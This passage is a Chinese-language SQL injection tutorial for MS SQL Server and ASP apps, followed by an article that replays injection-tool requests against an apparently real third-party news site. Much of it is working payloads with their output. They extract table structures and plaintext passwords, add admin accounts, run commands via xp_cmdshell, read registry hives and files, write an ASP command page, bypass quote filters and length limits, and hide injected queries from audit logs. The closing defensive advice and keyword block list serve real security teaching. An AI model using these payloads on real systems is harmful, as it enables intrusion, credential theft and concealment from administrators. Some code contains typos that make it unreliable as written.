Insert into users values(0,&amp;apos;guest&amp;apos;,&amp;apos;guest&amp;apos;,0x0000)

Insert into users values(0,&amp;apos;chris&amp;apos;,&amp;apos;password&amp;apos;,0x00ff)

Insert into users values(0,&amp;apos;fred&amp;apos;,&amp;apos;sesame&amp;apos;,0x00ff)

如果我们的攻击者想插入一个自己的用户。在不知道users表结构的情况下，他不可能成功。即使他比较幸运，至于privs字段不清楚。攻击者可能插入一个&amp;apos;1&amp;apos;，这样只给他自己一个低权限的用户。

幸运地，如果从应用程序（默认为ASP行为）返回错误消息，那么攻击者可以确定整个数据库的结构，并且可以以程序中连接SQLSERVER的权限度曲任何值。

（下面以一个简单的数据库和asp脚本来举例说明他们是怎么工作的）

首先，攻击者想获得建立用户的表的名字和字段的名字，要做这些，攻击者需要使用select语法的having子句：

Username：&amp;apos; having 1=1-

这样将会出现如下错误：

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e14&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]Column &amp;apos;users.id&amp;apos; is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.

/process_login.asp, line 35

因此现在攻击者知道了表的名字和第一个地段的名字。他们仍然可以通过把字段放到group by子句只能感去找到一个一个字段名，如下：

Username：&amp;apos; group by users.id having 1=1-

出现的错误如下：

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e14&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]Column &amp;apos;users.username&amp;apos; is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.

/process_login.asp, line 35

最终攻击者得到了username字段后：

&amp;apos; group by users.id,users.username,users.password,users.privs having 1=1-

这句话并不产生错误，相当于：

select * from users where username=&amp;apos;&amp;apos;

因此攻击者现在知道查询涉及users表，按顺序使用列&amp;apos;id,username,password,privs&amp;apos;。

能够确定每个列的类型是非常有用的。这可以通过使用类型转化来实现，例如：

Username：&amp;apos; union select sum(username) from users-

这利用了SQLSERVER在确定两个结果集的字段是否相等前应用sum子句。尝试去计算sum会得到以下消息：

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e07&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument.

/process_login.asp, line 35

这告诉了我们&amp;apos;username&amp;apos;字段的类型是varchar。如果是另一种情况，我们尝试去计算sum()的是数字类型，我们得到的错误消息告诉我们两个集合的字段数量不相等。

Username：&amp;apos; union select sum(id) from users-

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e14&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target lists.

/process_login.asp, line 35

我们可以用这种技术近似地确定数据库中任何表中的任何字段的类型。

这样攻击者就可以写一个好的insert查询，例如：

Username：&amp;apos;;insert into users values(666,&amp;apos;attacker&amp;apos;,&amp;apos;foobar&amp;apos;,&amp;apos;0xffff)-

这种技术的潜在影响不仅仅是这些。攻击者可以利用这些错误消息显示环境信息或数据库。通过运行一列一定格式的字符串可以获得标准的错误消息：

select * from master ..sysmessages

解释这些将实现有趣的消息。

一个特别有用的消息关系到类型转化。如果你尝试将一个字符串转化成一个整型数字，那么字符串的所有内容会返回到错误消息中。例如在我们简单的登陆页面中，在username后面会显示出SQLSERVER的版本和所运行的操作系统信息：

Username：&amp;apos; union select @@version,1,1,1-

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e07&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value &amp;apos;Microsoft SQL Server 2000 - 8.00.194 (Intel X86) Aug 6 2000 00:57:48 Copyright (c) 1988-2000 Microsoft Corporation Enterprise Edition on Windows NT 5.0 (Build 2195: Service Pack 2) &amp;apos; to a column of data type int.

/process_login.asp, line 35

这句尝试去将内置的&amp;apos;@@version&amp;apos;常量转化成一个整型数字，因为users表中的第一列是整型数字。

这种技术可以用来读取数据库中任何表的任何值。自从攻击者对用户名和用户密码比较感兴趣后，他们比较喜欢去从users表中读取用户名，例如：

Username：&amp;apos; union select min(username),1,1,1 from users where username&gt;&amp;apos;a&amp;apos;-

这句选择users表中username大于&amp;apos;a&amp;apos;中的最小值，并试图把它转化成一个整型数字：

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e07&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value &amp;apos;admin&amp;apos; to a column of data type int.

/process_login.asp, line 35

因此攻击者已经知道用户admin是存在的。这样他就可以重复通过使用where子句和查询到的用户名去寻找下一个用户。

Username：&amp;apos; union select min(username),1,1,1 from users where username&gt;&amp;apos;admin&amp;apos;-

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e07&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value &amp;apos;chris&amp;apos; to a column of data type int.

/process_login.asp, line 35

一旦攻击者确定了用户名，他就可以开始收集密码：

Username：&amp;apos; union select password,1,1,1 from users where username=&amp;apos;admin&amp;apos;-

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e07&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value &amp;apos;r00tr0x!&amp;apos; to a column of data type int.

/process_login.asp, line 35

一个更高级的技术是将所有用户名和密码连接长一个单独的字符串，然后尝试把它转化成整型数字。这个例子指出：Transavt-SQL语法能够在不改变相同的行的意思的情况下把它们连接起来。下面的脚本将把值连接起来：

begin declare @ret varchar(8000)

set @ret=&amp;apos;:&amp;apos;

select @ret=@ret+&amp;apos; &amp;apos;+username+&amp;apos;/&amp;apos;+password from users where

username&gt;@ret

select @ret as ret into foo

end

攻击者使用这个当作用户名登陆（都在一行）

Username: &amp;apos;; begin declare @ret varchar(8000) set @ret=&amp;apos;:&amp;apos; select @ret=@ret+&amp;apos; &amp;apos;+username+&amp;apos;/&amp;apos;+password from users where username&gt;@ret select @ret as ret into foo end-

这就创建了一个foo表，里面只有一个单独的列&amp;apos;ret&amp;apos;，里面存放着我们得到的用户名和密码的字符串。正常情况下，一个低权限的用户能够在同一个数据库中创建表，或者创建临时数据库。

然后攻击者就可以取得我们要得到的字符串：

Username：&amp;apos; union select ret,1,1,1 from foo-

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e07&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value &amp;apos;: admin/r00tr0x! guest/guest chris/password fred/sesame&amp;apos; to a column of data type int.

/process_login.asp, line 35

然后丢弃（删除）表来清楚脚印：

Username：&amp;apos;; drop table foo-

这个例子仅仅是这种技术的一个表面的作用。没必要说，如果攻击者能够从数据库中获得足够的错误西，他们的工作就变的无限简单。

获得更高的权限

一旦攻击者控制了数据库，他们就想利用那个权限去获得网络上更高的控制权。这可以通过许多途径来达到：

1\. 在数据库服务器上，以SQLSERVER权限利用xp_cmdshell扩展存储过程执行命令。

2\. 利用xp_regread扩展存储过程去读注册表的键值，当然包括SAM键（前提是SQLSERVER是以系统权限运行的）

3\. 利用其他存储过程去改变服务器

4\. 在连接的服务器上执行查询

5\. 创建客户扩展存储过程去在SQLSERVER进程中执行溢出代码

6\. 使用&amp;apos;bulk insert&amp;apos;语法去读服务器上的任意文件

7\. 使用bcp在服务器上建立任意的文本格式的文件

8\. 使用sp_OACreate,sp_OAMethod和sp_OAGetProperty系统存储过程去创建ActiveX应用程序，使它能做任何ASP脚本可以做的事情

这些只列举了非常普通的可能攻击方法的少量，攻击者很可能使用其它方法。我们介绍收集到的攻击关于SQL服务器的明显攻击方法，为了说明哪方面可能并被授予权限去注入SQL.。我们将依次处理以上提到的各种方法.

[xp_cmdshell]

许多存储过程被创建在SQLSERVER中，执行各种各样的功能，例如发送电子邮件和与注册表交互。

Xp_cmdshell是一个允许执行任意的命令行命令的内置的存储过程。例如：

Exec master..xp_cmdshell &amp;apos;dir&amp;apos;

将获得SQLSERVER进程的当前工作目录中的目录列表。

Exec master..xp_cmdshell &amp;apos;net user&amp;apos;

将提供服务器上所有用户的列表。当SQLSERVER正常以系统帐户或域帐户运行时，攻击者可以做出更严重的危害。

[xp_regread]

另一个有用的内置存储过程是xp_regXXXX类的函数集合。

Xp_regaddmultistring

Xp_regdeletekey

Xp_regdeletevalue

Xp_regenumkeys

Xp_regenumvalues

Xp_regread

Xp_regremovemultistring

Xp_regwrite

这些函数的使用方法举例如下：

exec xp_regread HKEY_LOCAL_MACHINE,&amp;apos;SYSTEM\CurrentControlSet\Services\lanmanserver\parameters&amp;apos;, &amp;apos;nullsessionshares&amp;apos;

这将确定什么样的会话连接在服务器上是可以使用的

exec xp_regenumvalues HKEY_LOCAL_MACHINE,&amp;apos;SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities&amp;apos;

这将显示服务器上所有SNMP团体配置。在SNMP团体很少被更改和在许多主机间共享的情况下，有了这些信息，攻击者或许会重新配置同一网络中的网络设备。

这很容易想象到一个攻击者可以利用这些函数读取SAM，修改系统服务的配置，使它下次机器重启时启动，或在下次任何用户登陆时执行一条任意的命令。

[其他存储过程]

xp_servicecontrol过程允许用户启动，停止，暂停和继续服务：

exec master..xp_servicecontrol &amp;apos;start&amp;apos;,&amp;apos;schedule&amp;apos;

exec master..xp_servicecontrol &amp;apos;start&amp;apos;,&amp;apos;server&amp;apos;

下表中列出了少量的其他有用的存储过程：

Xp_availablemedia 显示机器上有用的驱动器

Xp_dirtree 允许获得一个目录树

Xp_enumdsn 列举服务器上的ODBC数据源

Xp_loginconfig Reveals information about the security mode of the server

Xp_makecab 允许用户在服务器上创建一个压缩文件

Xp_ntsec_enumdomains 列举服务器可以进入的域

Xp_terminate_process 提供进程的进程ID，终止此进程

[Linked Servers]

SQL SERVER提供了一种允许服务器连接的机制，也就是说允许一台数据库服务器上的查询能够操作另一台服务器上的数据。这个链接存放在 master.sysservers表中。如果一个连接的服务器已经被设置成使用&amp;apos;sp_addlinkedsrvlogin&amp;apos;过程，当前可信的连接不用登陆就可以访问到服务器。&amp;apos;openquery&amp;apos;函数允许查询脱离服务器也可以执行。

[Custom extended stored procedures]

扩展存储过程应用程序接口是相当简单的，创建一个携带恶意代码的扩展存储过程动态连接库是一个相当简单的任务。使用命令行有几个方法可以上传动态连接库到SQL服务器上，还有其它包括了多种自动通讯的通讯机制，比如HTTP下载和FTP脚本。

一旦动态连接库文件在机器上运行即SQL服务器能够被访问--这不需要它自己是SQL服务器--攻击者就能够使用下面的命令添加扩展存储过程（这种情况下，我们的恶意存储过程就是一个能输出服务器的系统文件的小的木马）：

Sp_addextendedproc &amp;apos;xp_webserver&amp;apos;,&amp;apos;c:\temp\xp_foo.dll&amp;apos;

在正常的方式下，这个扩展存储过程可以被运行：

exec xp_webserver

一旦这个程序被运行，可以使用下面的方法将它除去：

xp_dropextendedproc &amp;apos;xp_webserver&amp;apos;

[将文本文件导入表]

使用&amp;apos;bulk insert&amp;apos;语法可以将一个文本文件插入到一个临时表中。简单地创建这个表：

create table foo( line varchar(8000) )

然后执行bulk insert操作把文件中的数据插入到表中，如：

bulk insert foo from &amp;apos;c:\inetpub\wwwroot\process_login.asp&amp;apos;

可以使用上述的错误消息技术，或者使用&amp;apos;union&amp;apos;选择，使文本文件中的数据与应用程序正常返回的数据结合，将数据取回。这个用来获取存放在数据库服务器上的脚本源代码或者ASP脚本代码是非常有用的。

[使用bcp建立文本文件]

使用&amp;apos;bulk insert&amp;apos;的相对技术可以很容易建立任意的文本文件。不幸的是这需要命令行工具。&amp;apos;bcp&amp;apos;,即&amp;apos;bulk copy program&amp;apos;

既然 bcp可以从SQL服务进程外访问数据库，它需要登陆。这代表获得权限不是很困难，既然攻击者能建立，或者利用整体安全机制(如果服务器配置成可以使用它)。

命令行格式如下：

bcp &quot;select * from text..foo&quot; queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar

&amp;apos;S&amp;apos;参数为执行查询的服务器，&amp;apos;U&amp;apos;参数为用户名，&amp;apos;P&amp;apos;参数为密码，这里为&amp;apos;foobar&amp;apos;

[ActiveX automation scripts in SQL SERVER]

SQL SERVER中提供了几个内置的允许创建ActiveX自动执行脚本的存储过程。这些脚本和运行在windows脚本解释器下的脚本，或者ASP脚本程序一样--他们使用VBScript或javascript书写，他们创建自动执行对象并和它们交互。一个自动执行脚本使用这种方法书写可以在 Transact-SQL中做任何在ASP脚本中，或者WSH脚本中可以做的任何事情。为了阐明这鞋，这里提供了几个例子：

（1）这个例子使用&amp;apos;wscript.shell&amp;apos;对象建立了一个记事本的实例：

wscript.shell example

declare @o int

exec sp_oacreate &amp;apos;wscript.shell&amp;apos;,@o out

exec sp_oamethod @o,&amp;apos;run&amp;apos;,NULL,&amp;apos;notepad.exe&amp;apos;

我们可以通过指定在用户名后面来执行它：

Username：&amp;apos;; declare @o int exec sp_oacreate &amp;apos;wscript.shell&amp;apos;,@o out exec sp_oamethod @o,&amp;apos;run&amp;apos;,NULL,&amp;apos;notepad.exe&amp;apos;-

(2)这个例子使用&amp;apos;scripting.filesystemobject&amp;apos;对象读一个已知的文本文件：

--scripting.filesystemobject example - read a known file

declare @o int, @f int, @t int, @ret int

declare @line varchar(8000)

exec sp_oacreate &amp;apos;scripting.filesystemobject&amp;apos;, @o out

exec sp_oamethod @o, &amp;apos;opentextfile&amp;apos;, @f out, &amp;apos;c:\boot.ini&amp;apos;, 1

exec @ret=sp_oamethod @f,&amp;apos;readline&amp;apos;,@line out

while(@ret=0)

begin

print @line

exec @ret=sp_oamethod @f,&amp;apos;readline&amp;apos;,@line out

end

(3)这个例子创建了一个能执行通过提交到的任何命令：

-- scripting.filesystemobject example - create a &amp;apos;run this&amp;apos;.asp file

declare @o int,@f int,@t int,@ret int

exec sp_oacreate &amp;apos;scripting.filesystemobject&amp;apos;,@o out

exec sp_oamethod @o,&amp;apos;createtextfile&amp;apos;,@f out,&amp;apos;c:\inetpub\wwwroot\foo.asp&amp;apos;,1

exec @ret=sp_oamethod @f,&amp;apos;writeline&amp;apos;,NULL,&amp;apos;&amp;apos;

需要指出的是如果运行的环境是WIN NT4+IIS4平台上，那么通过这个程序运行的命令是以系统权限运行的。在IIS5中，它以一个比较低的权限IWAM_XXXaccount运行。

(4)这些例子阐述了这个技术的适用性；它可以使用&amp;apos;speech.voicetext&amp;apos;对象引起SQL SERVER发声：

declare @o int,@ret int

exec sp_oacreate &amp;apos;speech.voicetext&amp;apos;,@o out

exec sp_oamethod @o,&amp;apos;register&amp;apos;,NULL,&amp;apos;foo&amp;apos;,&amp;apos;bar&amp;apos;

exec sp_oasetproperty @o,&amp;apos;speed&amp;apos;,150

exec sp_oamethod @o,&amp;apos;speak&amp;apos;,NULL,&amp;apos;all your sequel servers are belong to,us&amp;apos;,528

waitfor delay &amp;apos;00:00:05&amp;apos;

我们可以在我们假定的例子中，通过指定在用户名后面来执行它（注意这个例子不仅仅是注入一个脚本，同时以admin权限登陆到应用程序）：

Username：admin&amp;apos;;declare @o int,@ret int exec sp_oacreate &amp;apos;speech.voicetext&amp;apos;,@o out exec sp_oamethod @o,&amp;apos;register&amp;apos;,NULL,&amp;apos;foo&amp;apos;,&amp;apos;bar&amp;apos; exec sp_oasetproperty @o,&amp;apos;speed&amp;apos;,150 exec sp_oamethod @o,&amp;apos;speak&amp;apos;,NULL,&amp;apos;all your sequel servers are belong to us&amp;apos;,528 waitfor delay &amp;apos;00:00:05&amp;apos;--

[存储过程]

传说如果一个ASP应用程序在数据库中使用了存储过程，那么SQL注入是不可能的。这句话只对了一半，这要看ASP脚本中调用这个存储过程的方式。

本质上，如果一个有参数的查询被执行 ，并且用户提供的参数通过安全检查才放入到查询中，那么SQL注入明显是不可能发生的。但是如果攻击者努力影响所执行查询语句的非数据部分，这样他们就可能能够控制数据库。

比较好的常规的标准是：

?如果一个ASP脚本能够产生一个被提交的SQL查询字符串，即使它使用了存储过程也是能够引起SQL注入的弱点。

?如果一个ASP脚本使用一个过程对象限制参数的往存储过程中分配（例如ADO的用于参数收集的command对象），那么通过这个对象的执行，它一般是安全的。

明显地，既然新的攻击技术始终地被发现，好的惯例仍然是验证用户所有的输入。

为了阐明存储过程的查询注入，执行以下语句：

sp_who &amp;apos;1&amp;apos; select * from sysobjects

or

sp_who &amp;apos;1&amp;apos;;select * from sysobjects

任何一种方法，在存储过程后，追加的查询依然会执行。

[高级SQL注入]

通常情况下，一个web应用程序将会过滤单引号（或其他符号），或者限定用户提交的数据的长度。

在这部分，我们讨论一些能帮助攻击者饶过那些明显防范SQL注入，躲避被记录的技术。

[没有单引号的字符串]

有时候开发人员会通过过滤所有的单引号来保护应用程序，他们可能使用VBScript中的replace函数或类似：

function escape(input)

input=replace(input,&quot;&amp;apos;&quot;,&quot;&amp;apos;&amp;apos;&quot;)

escape=input

end function

无可否认地这防止了我们所有例子的攻击，再除去&amp;apos;;&amp;apos;符号也可以帮很多忙。但是在一个大型的应用程序中，好象个别值期望用户输入的是数字。这些值没有被限定，因此为攻击者提供了一个SQL注入的弱点。

如果攻击者想不使用单引号产生一个字符串值，他可以使用char函数，例如：

insert into users values(666,

char(0x63)+char(0x68)+char(0x72)+char90x69)+char(0x73), char(0x63)+char(0x68)+char(0x72)+char90x69)+char(0x73),

0xffff)

这就是一个能够往表中插入字符串的不包含单引号的查询。

淡然，如果攻击者不介意使用一个数字用户名和密码，下面的语句也同样会起作用：

insert into users values(667,

123,

123,

oxffff)

SQL SERVER自动地将整型转化为varchar型的值。

[Second-Order SQL Injection]

即使应用程序总是过滤单引号，攻击者依然能够注入SQL同样通过应用程序使数据库中的数据重复使用。

例如，攻击者可能利用下面的信息在应用程序中注册：

Username：admin&amp;apos;-

Password：password

应用程序正确过滤了单引号，返回了一个类似这样的insert语句：

insert into users values(123,&amp;apos;admin&amp;apos;&amp;apos;-&amp;apos;,&amp;apos;password&amp;apos;,0xffff)

我们假设应用程序允许用户修改自己的密码。这个ASP脚本程序首先保证用户设置新密码前拥有正确的旧密码。代码如下：

username = escape( Request.form(&quot;username&quot;) );

oldpassword = escape( Request.form(&quot;oldpassword&quot;) );

newpassword = escape( Request.form(&quot;newpassword&quot;) );

var rso = Server.CreateObject(&quot;ADODB.Recordset&quot;);

var sql = &quot;select * from users where username = &amp;apos;&quot; + username + &quot;&amp;apos; and password = &amp;apos;&quot; + oldpassword + &quot;&amp;apos;&quot;;

rso.open( sql, cn );

if (rso.EOF)

{

…

设置新密码的代码如下：

sql = &quot;update users set password = &amp;apos;&quot; + newpassword + &quot;&amp;apos; where username = &amp;apos;&quot; + rso(&quot;username&quot;) + &quot;&amp;apos;&quot;

rso(&quot;username&quot;)为登陆查询中返回的用户名

当username为admin&amp;apos;-时，查询语句为：

update users set password = &amp;apos;password&amp;apos; where username=&amp;apos;admin&amp;apos;-&amp;apos;

这样攻击者可以通过注册一个admin&amp;apos;-的用户来根据自己的想法来设置admin的密码。

这是一个非常严重的问题，目前在大型的应用程序中试图去过滤数据。最好的解决方法是拒绝非法输入，这胜于简单地努力去修改它。这有时会导致一个问题，非法的字符在那里是必要的，例如在用户名中包含&amp;apos;符号，例如

O&amp;apos;Brien

从一个安全的观点来看，最好的解答是但引号不允许存在是一个简单的事实。如果这是无法接受的话，他们仍然要被过滤；在这种情况下，保证所有进入SQL查询的数据都是正确的是最好的方法。

如果攻击者不使用任何应用程序莫名其妙地往系统中插入数据，这种方式的攻击也是可能的。应用程序可能有email接口，或者可能在数据库中可以存储错误日志，这样攻击者可以努力控制它。验证所有数据，包括数据库中已经存在的数据始终是个好的方法。确认函数将被简单地调用，例如：

if(not isValid(&quot;email&quot;,request.querystring(&quot;email&quot;))) then

response.end

或者类似的方法。

[长度限制]

为了给攻击者更多的困难，有时输入数据的长度是被限制的。当这个阻碍了攻击时，一个小的SQL可以造成很严重的危害。例如：

Username：&amp;apos;;shutdown-

这样只用12个输入字符就将停止SQL SERVER实例。另一个例子是：

drop table  

如果限定长度是在过滤字符串后应用将会引发另一个问题。假设用户名被限定16个字符，密码也被限定16个字符，那么下面的用户名和密码结合将会执行上面提到的shutdown命令：

Username：aaaaaaaaaaaaaaa&amp;apos;

Password：&amp;apos;; shutdown-

原因是应用程序尝试去过滤用户名最后的单引号，但是字符串被切断成16个字符，删除了过滤后的一个单引号。这样的结果就是如果密码字段以单引号开始，它可以包含一些SQL语句。既然这样查询看上去是：

select * from users where username=&amp;apos;aaaaaaaaaaaaaaa&amp;apos;&amp;apos; and password=&amp;apos;&amp;apos;&amp;apos;;shutdown-

实际上，查询中的用户名已经变为：

aaaaaaaaaaaaaaa&amp;apos; and password=&amp;apos;

因此最后的SQL语句会被执行。

[审计]

SQL SERVER包含了丰富的允许记录数据库中的各种事件的审计接口，它包含在sp_traceXXX类的函数中。特别有意思的是能够记录所有SQL语句，然后在服务器上执行的T-SQL的事件。如果这种审计是被激活的，我们讨论的所有注入的SQL查询都将被记录在数据库中，一个熟练的数据库管理员将能够知道发生了什么事。不幸地，如果攻击者追加以下字符串：

Sp_password

到一个Transact-SQL语句中，这个审计机制记录日志如下：

--&amp;apos;sp_password&amp;apos; was found in the text of this event.

-- The text has been replaced with this comment for security reasons.

这种行为发生在所有的T-SQL日记记录中，即使&amp;apos;sp_password&amp;apos;发生在一个注释中。这个过程打算通过sp_password隐藏用户的密码，但这对于一个攻击者来说是非常有用的方法。

因此，为了隐藏所有注入，攻击者需要简单地在&amp;apos;-&amp;apos;注释字符后追加sp_password，例如：

Username：admin&amp;apos;-sp_password

事实上一些被执行的SQL将被记录，但是查询本身将顺利地从日志中消失。

[防范]

这部分讨论针对记述的攻击的一些防范。我们将讨论输入确认和提供一些简单的代码，然后我们将从事SQL SERVER锁定。

[输入验证]

输入验证是一个复杂的题目。比较有代表性的是，自从过于严密地确认倾向于引起部分应用程序的暂停，输入确认问题很难被解决，在项目开发中投入很少的注意力在输入确认上。输入确认不是倾向于将它加入到应用程序的功能当中，因此它一般会被忽视。

下面是一个含有简单代码的讨论输入确认的大纲。这个简单的代码不能直接用于应用程序中，但是它十分清晰地阐明了不同的策略。

不同的数据确认方法可以按以下分类：

1） 努力修改数据使它成为正确的

2） 拒绝被认为是错误的输入

3） 只接收被认为是正确的输入

第一种情况有一些概念上的问题；首先，开发人员没必要知道那些是错误数据，因为新的错误数据的形式始终被发现。其次，修改数据会引起上面描述过的数据的长度问题。最后，二次使用的问题包括系统中已经存在数据的重新使用。

第二种情况也存在第一种情况中的问题；已知的错误输入随着攻击技术的发展变化。

第三种情况可能是三种中最好的，但是很难实现。

从安全角度看合并第二种方法和第三种方法可能是最好的方法--只允许正确的输入，然后搜索输入中已知的错误数据。

带有连接符号的姓名的问题对于体现合并两种方法的必要性是一个好的例子：

Quentin Bassington-Bassington

我们必须在正确输入中允许连接符号，但是我们也意识到字符序列&amp;apos;-&amp;apos;对SQL SERVER很重要。

当合并修改数据和字符序列确认时，会出现另一个问题。例如，如果我们应用一个错误过滤在除去单引号之后去探测&amp;apos;-&amp;apos;，&amp;apos;select&amp;apos;和&amp;apos;union&amp;apos;，攻击者可以输入：

uni&amp;apos;on sel&amp;apos;ect @@version-&amp;apos;-

既然单引号被除去，攻击者可以简单地散布单引号在自己的错误的字符串中躲避被发现。

这有一些确认代码的例子：

方法一--过滤单引号

function escape(input)

input=replace(input,&quot;&amp;apos;&quot;,&quot;&amp;apos;&amp;apos;&quot;)

escape=input

end function

方法二--拒绝已知的错误输入

function validate_string(input)

known_bad=array(&quot;select&quot;,&quot;insert&quot;,&quot;update&quot;,&quot;delete&quot;,&quot;drop&quot;,&quot;-&quot;,&quot;&amp;apos;&quot;)

validate_string=true

for i=lbound(known_bad) to ubound(known_bad)

if(instr(1,input,known_bad(i),vbtextcompare)0) then

validate_string=false

exit function

end if

next

end function

方法三--只允许正确的输入

function validatepassword(input)

good_password_chars=&quot; abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;

validatepassword=true

for i=1 to len(input)

c=mid(input,I,1)

if(InStr(good_password_chars,c)=0) then

validatepassword=false

exit function

end if

next

end function

[SQL SERVER锁定]

在这指出的重要一点是锁定SQL SERVER是必要的；外面的是不安全的。这是一个但创建SQL SERVER时需要做的事情的简短的列表：

1.确定连接服务器的方法

a.确定你所使用的网络库是可用的，那么使用&quot;Network Utility&quot;

2.确定哪些帐户是存在的

a.为应用程序的使用创建一个低权限的帐户

b.删除不必要的帐户

c.确定所有帐户有强壮的密码；执行密码审计

3.确定哪些对象存在

a.许多扩展存储过程能被安全地移除。如果这样做了，应该移除包含在扩展存储过程代码中的&amp;apos;.dll&amp;apos;文件

b.移除所有示例数据库--例如&amp;apos;northwind&amp;apos;和&amp;apos;pubs&amp;apos;数据库

4.确定哪写帐户能过使用哪些对象

a.应用程序进入数据库所使用的帐户应该有保证能够使用它需要的对象的最小权限

5.确定服务器的补丁

a.针对SQL SERVER有一些缓冲区溢出和格式化字符串攻击，也有一些其他的安全补丁发布。应该存在很多。

6.确定什么应该被日志记录，什么应该在日志中结束。

[参考文献]

[1] Web Application Disassembly with ODBC Error Messages, David Litchfield

[http://www.nextgenss.com/papers/webappdis.doc](http://www.nextgenss.com/papers/webappdis.doc)

[2] SQL Server Security Checklist

[http://www.sqlsecurity.com/checklist.asp](http://www.sqlsecurity.com/checklist.asp)

[3] SQL Server 2000 Extended Stored Procedure Vulnerability

[http://www.atstake.com/research/adv...0/a120100-2.txt](http://www.atstake.com/research/adv...0/a120100-2.txt)

[4] Microsoft SQL Server Extended Stored Procedure Vulnerability

[http://www.atstake.com/research/adv...0/a120100-1.txt](http://www.atstake.com/research/adv...0/a120100-1.txt)

[5] Multiple Buffer Format String Vulnerabilities In SQL Server

[http://www.microsoft.com/technet/se...in/MS01-060.asp](http://www.microsoft.com/technet/se...in/MS01-060.asp)

[http://www.atstake.com/research/adv...1/a122001-1.txt](http://www.atstake.com/research/adv...1/a122001-1.txt)

#### SQL inject MS SQL Server {#sql-inject-ms-sql-server-0}

[http://www.webjx.com/database/sqlserver-18067.htm](http://www.webjx.com/database/sqlserver-18067.htm)

全面了解SQLServer注入过程

WebjxCom提示：这次用到的嗅探工具是sniffx专门嗅探http的数据包，功能不强大，但是足够这次活动的使用。

想了解sql注入的过程和原理，网上找了些文章，讲得都比较肤浅，但是我知道有几款国内比较常用的注入工具，比如Domain3.5、 NBSI3.0、啊D2.32、还有Pangolin、还有一些国外的。这里随便弄几个来研究一下就ok。这次用到的嗅探工具是sniffx专门嗅探 http的数据包，功能不强大，但是足够这次活动的使用。本来想使用ethereal或wireshark，但是里面复制数据包内容老是把没有转码的16 进制也复制了过来，有点麻烦。也就是说这两个工具用得不娴熟。

【查询数据库信息】

本地没有找到好点的有注入漏洞的系统，只好在网上寻找了，先用Domain3.5，运行很好以来就找到个sqlserver，sa权限的注入点，点Domain3.5上面的&quot;开始检测&quot;

以下是Domain3.5中嗅探出来的http数据包：

news_show.asp?id=15618%20and%201=1

news_show.asp?id=15618%20and%201=2

news_show.asp?id=15618%20and%20exists%20(select%20*%20from%20sysobjects)

news_show.asp?id=15618%20and%20char(124)%2Buser%2Bchar(124)=0

news_show.asp?id=15618;declare%20@a%20int-

news_show.asp?id=15618%20and%20char(124)%2Bdb_name()%2Bchar(124)=0

news_show.asp?id=15618%20And%20IS_SRVROLEMEMBER(0×730079007300610064006D0069006E00)=1

以下是NBSI3.0中嗅探出来的http数据包：

news_show.asp?id=15618%20and%20user%2Bchar(124)=0

news_show.asp?id=15618%20And%20system_user%2Bchar(124)=0

news_show.asp?id=15618%20And%20Cast(IS_SRVROLEMEMBER(0×730079007300610064006D0069006E00)%20as%20nvarchar(1))%2Bchar(124)=1

news_show.asp?id=15618%20And%20db_name()%2Bchar(124)=0

news_show.asp?id=15618;declare%20@a%20int-

啊D和Pangolin的数据包这里就不列出来了，都差不多。基本的过程是通过and 1=1和and 1=2来判断是否可注入，一般1=1返回http 200(ok),1=2返回http 500(internal server error)表示injectable。然后and exists(select * from sysobjects)来判断数据库类型，sysobjects是sqlserver每个数据库自带的用来存储数据库信息的表格，access每个数据库自带的表格是msysobjects。判断出来是sqlserver数据库之后，然后用系统自带的变量user,system_user和0比较，system_user是nchar类型，user是char类型，0是肯定是int类型，因为不同类型的数据在sqlserver中无法直接比较，所以对于开启错误提示的sqlserver来说就会报错，顺便将敏感信息也暴了出来：

关于user，system_user的解释，点上面的链接到msdn上去看看。

Cast(IS_SRVROLEMEMBER(0×730079007300610064006D0069006E00)%20as%20nvarchar(1))%2Bchar(124)=1中cast()作用是将一种数据类型的表达式显式转换为另一种数据类型的表达式。CAST 和 CONVERT 提供相似的功能。IS_SRVROLEMEMBER指示 SQL Server 2005 登录名是否为指定固定服务器角色的成员，返回值类型为int，0表示不是某某成员，1表示是。 0×730079007300610064006D0069006E00是&amp;apos;sysadmin&amp;apos;的16进制码,为啥要弄成16进制呢，我猜想可能是怕网站程序过滤点sysadmin关键字,如果页面正常返回(200),则表示该用户是sysadmin。精心将int转换成nvarchar(1)又会暴出类型转换错误，而这就是黑客所需要的信息。db_name()回暴出当前数据库名。

;declare%20@a%20int-申明一个int变量a，作用我不得而知。

接下来的工作是列出服务器上的数据库名：(假设服务器上有16个数据库)

news_show.asp?id=15618 And (Select char(124)%2BCast(Count(1) as varchar(8000))%2Bchar(124) From master..sysdatabases)%3E0

news_show.asp?id=15618 And char(124)+(Select Top 1 cast([name] as varchar(8000)) from(Select Top 1 dbid,name from [master]..[sysdatabases] order by [dbid]) T order by [dbid] desc)&gt;0

